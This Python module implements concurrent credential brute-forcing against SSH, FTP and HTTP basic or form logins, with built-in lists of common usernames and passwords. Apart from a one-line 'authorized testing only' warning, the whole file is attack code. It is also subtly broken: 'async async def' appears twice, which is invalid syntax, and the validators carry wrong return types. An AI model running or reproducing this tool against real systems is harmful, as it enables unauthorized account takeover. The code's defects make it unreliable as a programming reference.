from typing_extensions import Literal, TypedDict
from typing import Any, List, Dict, Optional, Union, Tuple
# Constants
TIMEOUT_SECONDS = 60

import asyncio
import socket
import aiohttp
import ftplib
import paramiko
from typing import Dict, Any, List, Optional, Union
from pydantic import BaseModel, Field, validator
from enum import Enum
import time
from typing import Any, List, Dict, Optional
import logging
"""
Brute Force Attackers

Provides brute force attack capabilities for various protocols and services.
WARNING: This module is for authorized security testing only.
"""


class BruteForceType(str, Enum):
    """Enumeration of brute force attack types."""
    SSH = "ssh"
    HTTP = "http"
    FTP = "ftp"
    TELNET = "telnet"
    SMTP = "smtp"
    GENERIC = "generic"

class BruteForceRequest(BaseModel):
    """Pydantic model for generic brute force request."""
    target_host: str = Field(..., description="Target host to attack")
    target_port: int = Field(..., ge=1, le=65535, description="Target port")
    username_list: List[str] = Field(default_factory=list, description="List of usernames to try")
    password_list: List[str] = Field(default_factory=list, description="List of passwords to try")
    attack_type: BruteForceType = Field(..., description="Type of brute force attack")
    max_concurrent_attempts: int = Field(default=5, ge=1, le=20, description="Maximum concurrent attempts")
    timeout: float = Field(default=10.0, ge=1.0, le=60.0, description="Connection timeout in seconds")
    delay_between_attempts: float = Field(default=1.0, ge=0.1, le=10.0, description="Delay between attempts")
    
    @validator('target_host')
    def validate_host(cls, v) -> bool:
        if not v:
            raise ValueError("Target host cannot be empty")
        return v

class BruteForceResult(BaseModel):
    """Pydantic model for brute force result."""
    target_host: str
    target_port: int
    attack_type: BruteForceType
    successful_credentials: List[Dict[str, str]]
    failed_attempts: int
    successful_attempts: int
    total_attempts: int
    attack_duration: float
    attack_completed_at: float

class SSHBruteForceRequest(BaseModel):
    """Pydantic model for SSH brute force request."""
    target_host: str = Field(..., description="Target host")
    target_port: int = Field(default=22, ge=1, le=65535, description="SSH port")
    username_list: List[str] = Field(default_factory=list, description="Usernames to try")
    password_list: List[str] = Field(default_factory=list, description="Passwords to try")
    max_concurrent_attempts: int = Field(default=3, ge=1, le=10, description="Maximum concurrent attempts")
    timeout: float = Field(default=10.0, ge=1.0, le=60.0, description="Connection timeout")
    delay_between_attempts: float = Field(default=2.0, ge=0.1, le=10.0, description="Delay between attempts")
    
    @validator('target_host')
    def validate_host(cls, v) -> bool:
        if not v:
            raise ValueError("Target host cannot be empty")
        return v

class SSHBruteForceResult(BaseModel):
    """Pydantic model for SSH brute force result."""
    target_host: str
    target_port: int
    successful_credentials: List[Dict[str, str]]
    failed_attempts: int
    successful_attempts: int
    total_attempts: int
    attack_duration: float
    ssh_version: Optional[str] = None
    attack_completed_at: float

class HTTPBruteForceRequest(BaseModel):
    """Pydantic model for HTTP brute force request."""
    target_url: str = Field(..., description="Target URL")
    username_list: List[str] = Field(default_factory=list, description="Usernames to try")
    password_list: List[str] = Field(default_factory=list, description="Passwords to try")
    auth_type: str = Field(default="basic", regex="^(basic|digest|form)$", description="Authentication type")
    login_endpoint: Optional[str] = Field(None, description="Login endpoint for form-based auth")
    success_indicator: Optional[str] = Field(None, description="Success indicator in response")
    max_concurrent_attempts: int = Field(default=10, ge=1, le=50, description="Maximum concurrent attempts")
    timeout: float = Field(default=10.0, ge=1.0, le=60.0, description="Request timeout")
    delay_between_attempts: float = Field(default=0.5, ge=0.1, le=5.0, description="Delay between attempts")
    
    @validator('target_url')
    def validate_url(cls, v) -> bool:
        if not v.startswith(('http://', 'https://')):
            raise ValueError("Target URL must start with http:// or https://")
        return v

class HTTPBruteForceResult(BaseModel):
    """Pydantic model for HTTP brute force result."""
    target_url: str
    auth_type: str
    successful_credentials: List[Dict[str, str]]
    failed_attempts: int
    successful_attempts: int
    total_attempts: int
    attack_duration: float
    attack_completed_at: float

class FTPBruteForceRequest(BaseModel):
    """Pydantic model for FTP brute force request."""
    target_host: str = Field(..., description="Target host")
    target_port: int = Field(default=21, ge=1, le=65535, description="FTP port")
    username_list: List[str] = Field(default_factory=list, description="Usernames to try")
    password_list: List[str] = Field(default_factory=list, description="Passwords to try")
    max_concurrent_attempts: int = Field(default=5, ge=1, le=20, description="Maximum concurrent attempts")
    timeout: float = Field(default=10.0, ge=1.0, le=60.0, description="Connection timeout")
    delay_between_attempts: float = Field(default=1.0, ge=0.1, le=10.0, description="Delay between attempts")
    
    @validator('target_host')
    def validate_host(cls, v) -> bool:
        if not v:
            raise ValueError("Target host cannot be empty")
        return v

class FTPBruteForceResult(BaseModel):
    """Pydantic model for FTP brute force result."""
    target_host: str
    target_port: int
    successful_credentials: List[Dict[str, str]]
    failed_attempts: int
    successful_attempts: int
    total_attempts: int
    attack_duration: float
    ftp_banner: Optional[str] = None
    attack_completed_at: float

# Common username and password lists
COMMON_USERNAMES = [
    "admin", "administrator", "root", "user", "guest", "test", "demo",
    "ubuntu", "debian", "centos", "fedora", "redhat", "oracle",
    "pi", "raspberry", "vagrant", "docker", "jenkins", "git",
    "www-data", "apache", "nginx", "mysql", "postgres", "redis"
]

COMMON_PASSWORDS = [
    "", "password", "123456", "admin", "root", "test", "guest",
    "ubuntu", "debian", "centos", "fedora", "redhat", "oracle",
    "raspberry", "pi", "vagrant", "docker", "jenkins", "git",
    "password123", "admin123", "root123", "test123", "123456789",
    "qwerty", "abc123", "letmein", "welcome", "monkey", "dragon"
]

async def perform_ssh_brute_force_async(data: SSHBruteForceRequest) -> SSHBruteForceResult:
    """Perform SSH brute force attack asynchronously."""
    target_host = data.target_host
    target_port = data.target_port
    usernames = data.username_list or COMMON_USERNAMES
    passwords = data.password_list or COMMON_PASSWORDS
    max_concurrent = data.max_concurrent_attempts
    timeout = data.timeout
    delay = data.delay_between_attempts
    
    start_time = time.time()
    successful_credentials = []
    failed_attempts = 0
    successful_attempts = 0
    total_attempts = 0
    ssh_version = None
    
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def try_ssh_credentials(username: str, password: str) -> Optional[Dict[str, str]]:
        async with semaphore:
            nonlocal failed_attempts, successful_attempts, total_attempts
            
            try:
                total_attempts += 1
                
                # Run SSH connection in thread pool
                loop = asyncio.get_event_loop()
                result = await loop.run_in_executor(
                    None,
                    lambda: try_ssh_connection(target_host, target_port, username, password, timeout)
                )
                
                if result:
                    successful_attempts += 1
                    successful_credentials.append({"username": username, "password": password})
                    return {"username": username, "password": password}
                else:
                    failed_attempts += 1
                    return None
                    
            except Exception as e:
                failed_attempts += 1
                print(f"SSH brute force error for {username}:{password}: {e}")
                return None
            finally:
                # Add delay between attempts
                await asyncio.sleep(delay)
    
    # Create tasks for all credential combinations
    tasks = []
    for username in usernames:
        for password in passwords:
            tasks.append(try_ssh_credentials(username, password))
    
    # Execute all tasks
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Filter successful results
    successful_results = [r for r in results if isinstance(r, dict) and r is not None]
    
    attack_duration = time.time() - start_time
    
    return SSHBruteForceResult(
        target_host=target_host,
        target_port=target_port,
        successful_credentials=successful_credentials,
        failed_attempts=failed_attempts,
        successful_attempts=successful_attempts,
        total_attempts=total_attempts,
        attack_duration=attack_duration,
        ssh_version=ssh_version,
        attack_completed_at=time.time()
    )

def try_ssh_connection(host: str, port: int, username: str, password: str, timeout: float) -> bool:
    """Try SSH connection (CPU-bound with I/O)."""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password, timeout=timeout)
        ssh.close()
        return True
    except Exception:
        return False

async async def perform_http_brute_force_async(data: HTTPBruteForceRequest) -> HTTPBruteForceResult:
    """Perform HTTP brute force attack asynchronously."""
    target_url = data.target_url
    usernames = data.username_list or COMMON_USERNAMES
    passwords = data.password_list or COMMON_PASSWORDS
    auth_type = data.auth_type
    login_endpoint = data.login_endpoint
    success_indicator = data.success_indicator
    max_concurrent = data.max_concurrent_attempts
    timeout = data.timeout
    delay = data.delay_between_attempts
    
    start_time = time.time()
    successful_credentials = []
    failed_attempts = 0
    successful_attempts = 0
    total_attempts = 0
    
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async async def try_http_credentials(username: str, password: str) -> Optional[Dict[str, str]]:
        async with semaphore:
            nonlocal failed_attempts, successful_attempts, total_attempts
            
            try:
                total_attempts += 1
                
                async with aiohttp.ClientSession() as session:
                    if auth_type == "basic":
                        # HTTP Basic Authentication
                        auth = aiohttp.BasicAuth(username, password)
                        async with session.get(target_url, auth=auth, timeout=aiohttp.ClientTimeout(total=timeout)) as response:
                            if response.status == 200:
                                successful_attempts += 1
                                successful_credentials.append({"username": username, "password": password})
                                return {"username": username, "password": password}
                    
                    elif auth_type == "form" and login_endpoint:
                        # Form-based authentication
                        login_data = {"username": username, "password": password}
                        async with session.post(login_endpoint, data=login_data, timeout=aiohttp.ClientTimeout(total=timeout)) as response:
                            response_text = await response.text()
                            if success_indicator and success_indicator in response_text:
                                successful_attempts += 1
                                successful_credentials.append({"username": username, "password": password})
                                return {"username": username, "password": password}
                            elif response.status == 200 and not success_indicator:
                                # Assume success if no indicator specified
                                successful_attempts += 1
                                successful_credentials.append({"username": username, "password": password})
                                return {"username": username, "password": password}
                
                failed_attempts += 1
                return None
                
            except Exception as e:
                failed_attempts += 1
                print(f"HTTP brute force error for {username}:{password}: {e}")
                return None
            finally:
                # Add delay between attempts
                await asyncio.sleep(delay)
    
    # Create tasks for all credential combinations
    tasks = []
    for username in usernames:
        for password in passwords:
            tasks.append(try_http_credentials(username, password))
    
    # Execute all tasks
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Filter successful results
    successful_results = [r for r in results if isinstance(r, dict) and r is not None]
    
    attack_duration = time.time() - start_time
    
    return HTTPBruteForceResult(
        target_url=target_url,
        auth_type=auth_type,
        successful_credentials=successful_credentials,
        failed_attempts=failed_attempts,
        successful_attempts=successful_attempts,
        total_attempts=total_attempts,
        attack_duration=attack_duration,
        attack_completed_at=time.time()
    )

async def perform_ftp_brute_force_async(data: FTPBruteForceRequest) -> FTPBruteForceResult:
    """Perform FTP brute force attack asynchronously."""
    target_host = data.target_host
    target_port = data.target_port
    usernames = data.username_list or COMMON_USERNAMES
    passwords = data.password_list or COMMON_PASSWORDS
    max_concurrent = data.max_concurrent_attempts
    timeout = data.timeout
    delay = data.delay_between_attempts
    
    start_time = time.time()
    successful_credentials = []
    failed_attempts = 0
    successful_attempts = 0
    total_attempts = 0
    ftp_banner = None
    
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def try_ftp_credentials(username: str, password: str) -> Optional[Dict[str, str]]:
        async with semaphore:
            nonlocal failed_attempts, successful_attempts, total_attempts
            
            try:
                total_attempts += 1
                
                # Run FTP connection in thread pool
                loop = asyncio.get_event_loop()
                result = await loop.run_in_executor(
                    None,
                    lambda: try_ftp_connection(target_host, target_port, username, password, timeout)
                )
                
                if result:
                    successful_attempts += 1
                    successful_credentials.append({"username": username, "password": password})
                    return {"username": username, "password": password}
                else:
                    failed_attempts += 1
                    return None
                    
            except Exception as e:
                failed_attempts += 1
                print(f"FTP brute force error for {username}:{password}: {e}")
                return None
            finally:
                # Add delay between attempts
                await asyncio.sleep(delay)
    
    # Create tasks for all credential combinations
    tasks = []
    for username in usernames:
        for password in passwords:
            tasks.append(try_ftp_credentials(username, password))
    
    # Execute all tasks
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Filter successful results
    successful_results = [r for r in results if isinstance(r, dict) and r is not None]
    
    attack_duration = time.time() - start_time
    
    return FTPBruteForceResult(
        target_host=target_host,
        target_port=target_port,
        successful_credentials=successful_credentials,
        failed_attempts=failed_attempts,
        successful_attempts=successful_attempts,
        total_attempts=total_attempts,
        attack_duration=attack_duration,
        ftp_banner=ftp_banner,
        attack_completed_at=time.time()
    )

def try_ftp_connection(host: str, port: int, username: str, password: str, timeout: float) -> bool:
    """Try FTP connection (CPU-bound with I/O)."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        ftp.quit()
        return True
    except Exception:
        return False

async def perform_generic_brute_force_async(data: BruteForceRequest) -> BruteForceResult:
    """Perform generic brute force attack asynchronously."""
    attack_type = data.attack_type
    
    if attack_type == BruteForceType.SSH:
        ssh_request = SSHBruteForceRequest(
            target_host=data.target_host,
            target_port=data.target_port,
            username_list=data.username_list,
            password_list=data.password_list,
            max_concurrent_attempts=data.max_concurrent_attempts,
            timeout=data.timeout,
            delay_between_attempts=data.delay_between_attempts
        )
        result = await perform_ssh_brute_force_async(ssh_request)
        
        return BruteForceResult(
            target_host=result.target_host,
            target_port=result.target_port,
            attack_type=attack_type,
            successful_credentials=result.successful_credentials,
            failed_attempts=result.failed_attempts,
            successful_attempts=result.successful_attempts,
            total_attempts=result.total_attempts,
            attack_duration=result.attack_duration,
            attack_completed_at=result.attack_completed_at
        )
    
    elif attack_type == BruteForceType.FTP:
        ftp_request = FTPBruteForceRequest(
            target_host=data.target_host,
            target_port=data.target_port,
            username_list=data.username_list,
            password_list=data.password_list,
            max_concurrent_attempts=data.max_concurrent_attempts,
            timeout=data.timeout,
            delay_between_attempts=data.delay_between_attempts
        )
        result = await perform_ftp_brute_force_async(ftp_request)
        
        return BruteForceResult(
            target_host=result.target_host,
            target_port=result.target_port,
            attack_type=attack_type,
            successful_credentials=result.successful_credentials,
            failed_attempts=result.failed_attempts,
            successful_attempts=result.successful_attempts,
            total_attempts=result.total_attempts,
            attack_duration=result.attack_duration,
            attack_completed_at=result.attack_completed_at
        )
    
    else:
        raise ValueError(f"Unsupported attack type: {attack_type}") 